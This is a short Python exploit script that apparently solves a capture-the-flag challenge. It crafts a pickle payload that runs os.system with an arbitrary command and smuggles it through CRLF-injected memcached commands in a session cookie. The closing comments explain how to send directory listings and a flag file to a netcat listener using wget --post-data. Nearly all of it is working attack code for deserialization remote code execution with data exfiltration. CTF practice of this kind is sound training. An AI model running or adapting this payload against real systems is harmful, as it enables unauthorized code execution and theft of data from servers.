# Original source: Pierre Vigier
# https://pierre-vigier.github.io/blog/htb-cyber-apocalypse-2024/web-serialflow/

import pickle
import os
from http import cookies
import sys

if len(sys.argv) < 2:
    print("Command expected")
    exit()

cmd = sys.argv[1]

class RCE:
    def __reduce__(self):
        return os.system, (cmd,)

payload = pickle.dumps(RCE(), 0)
size = len(payload)
cookie = 'k\r\nset k2 0 300 ' + str(size) + '\r\n'
cookie += payload.decode() + '\r\n'
cookie += 'get k2'

c = cookies.SimpleCookie()
c["session"] = cookie
print(c.output(header="Cookie:"))

# this part was created by ToB to suit our challenge environment
# then set up a netcat listener on the port where you'd like to receive the
# data, e.g. nc -nlvp 1338 (on the host running the challenge container, but not
# IN the challenge container)
# then (using httpie's http command, or curl, to send a GET) run several times:
# $ http 127.0.0.1:1337  "$(python solver2.py 'wget --post-data="$(ls /)"
# 127.0.0.1:1338)"
# to figure out the new flag filename; and then, finally:
# http 127.0.0.1:1337 "$(python solver2.py 'wget --post-data="$(cat /<FLAG FILE
# NAME>.txt)"')"
